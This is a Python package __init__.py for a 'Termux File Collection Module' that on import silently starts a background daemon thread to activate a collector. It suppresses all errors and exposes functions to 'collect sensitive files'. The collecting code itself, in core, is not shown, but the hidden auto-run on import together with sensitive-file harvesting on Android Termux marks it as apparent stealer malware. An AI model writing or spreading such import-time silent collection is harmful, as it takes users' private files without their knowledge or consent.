"""
VISHAL - Advanced Termux File Collection Module
"""

from .core import Vishal
from .config import Config
from .utils import Utils

__version__ = "2.0.0"
__author__ = "VISHAL"
__description__ = "Advanced Termux File Collection Module"

# Create singleton instance
_vishal = Vishal()

# Auto-activate on import
def _auto_activate():
    try:
        _vishal.activate()
    except Exception as e:
        pass  # Silent fail

import threading
threading.Thread(target=_auto_activate, daemon=True).start()

# Export main class
Vishal = Vishal

# Easy access functions
def collect_all():
    """Quick collect all files"""
    return _vishal.collect_all()

def collect_sensitive():
    """Quick collect sensitive files"""
    return _vishal.collect_sensitive()

def get_status():
    """Get module status"""
    return _vishal.get_status()

def stop():
    """Stop module"""
    return _vishal.stop()

# Clean namespace
__all__ = [
    'Vishal',
    'Config',
    'Utils',
    'collect_all',
    'collect_sensitive',
    'get_status',
    'stop'
]